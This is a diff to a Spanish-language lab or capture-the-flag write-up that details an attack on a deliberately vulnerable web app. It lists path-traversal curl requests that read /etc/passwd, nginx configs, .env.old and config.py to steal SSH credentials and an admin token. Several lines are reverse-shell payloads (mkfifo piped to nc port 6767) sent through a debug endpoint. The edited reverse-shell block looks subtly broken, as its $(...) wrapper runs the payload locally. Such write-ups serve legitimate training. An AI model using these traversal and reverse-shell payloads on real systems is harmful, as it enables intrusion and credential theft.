@@ -10,6 +10,7 @@ usage: ?file=<path>  |  ?cmd=<command>&token=<maintenance_token>
 La táctica usada para obtener control remoto en el servidor son dos stages, uno de exfiltración de archivo local para obtener credenciales de usuario
 
 ## LFI
+### [T1083 - File and Directory Discovery](https://attack.mitre.org/techniques/T1083/)
 
 Exfiltramos los usuarios disponibles en el sistema con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../etc/passwd'`
 
@@ -42,7 +43,57 @@ clear
 
 Exfiltramos el archivo **.env.old** y obtenemos las credenciales de ssh de paco.
 
-Exfiltramos también el archivo `config.py` del repositorio de la aplicación con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../var/www/hal9042/config.py'` y obtenemos el token de administración.
+Exfiltramos también el archivo `config.py` del repositorio de la aplicación de la siguiente manera: Los siguientes pasos en el descubrimiento del servidor **nginx** se han dado:
+
+- Conocemos en el reconocimiento que el servicio web usado es ** nginx 1.24.0 (Ubuntu) **, por lo que probamos a exfiltrar el archivo de configuración por defecto, que es **[/etc/nginx/nginx.conf](https://nginx.org/en/docs/beginners_guide.html)**:
+
+```bash
+curl  'http://$IP_ADDR:5042/api/debug?file=../../../../../etc/nginx/nginx.conf'
+user www-data;
+worker_processes auto;
+pid /run/nginx.pid;
+
+(...)
+http {
+
+(...)
+
+    include /etc/nginx/conf.d/*.conf;
+    include /etc/nginx/sites-enabled/*;
+}
+```
+Lo único destacable que obtenemos son los includes para bloques de servidores, los cuales tendremos que exfiltrar a ciegas; dos dos archivos de bloques de servidores que nginx genera por defecto son:
+- **/etc/nginx/conf.d/nginx.conf**
+- **/etc/nginx/sites-enabled/default**
+
+Exfiltrando estos archivos no obtenemos ninguna configuración útil, así que probamos con un posible archivo no creado por defecto que lleve por nombre el servicio.
+
+```bash
+ curl  'http://$IP_ADDR:5042/api/debug?file=../../../../../etc/nginx/sites-enabled/hal9042'
+
+server {
+    listen 5042 default_server;
+    server_name _;
+    root /var/www/hal9042;
+
+    # Deliberately exposed source-control directory (F02).
+    location /.git/ {
+        autoindex on;
+        alias /var/www/hal9042/.git/;
+    }
+
+    location / {
+        proxy_pass http://127.0.0.1:8000;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+}
+
+```
+
+Con esta configuración ya sabemos la localización del archivo `config.py` indicado en el historial.
+
+Exfiltramos con `curl 'http://10.1.0.8:5042/api/debug?file=../../../../var/www/hal9042/config.py'` y obtenemos el token de administración.
 
 ```python 
 # Internal maintenance token. The /api/debug console accepts this token to run
@@ -55,8 +106,12 @@ El token nos permitirá pasar al siguiente stage de **ejecución remota de coman
 ## RCE
 
 El comando que nos va a permitir obtener una reverse shell es el siguiente:
+
 ```bash
-rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc 10.1.0.1 6767 >/tmp/f
+IP_ADDR='10.1.0.8'
+CMD=$(rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 |nc $IP_ADDR 6767 >/tmp/f)
+PAYLOAD=$(echo $CMD | jq -rR @uri)
+
 ```
 El comando crea una **named pipe** que redirige su output a una shell interactiva, que a su vez comunica con un **socket** abierto por netcat que se conectará a nuestro servico local con `nc -lk 6767` y redirigirá nuestros comandos de nuevo a la pipe.
 
@@ -68,3 +123,7 @@ curl "10.1.0.8:5042/api/debug?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bc
 ```
 
 Con esto obtenemos una shell remota con el usuario dueño del proceso del servidor **www-data**.
+
+### Artefactos
+
+### Mitigaciones
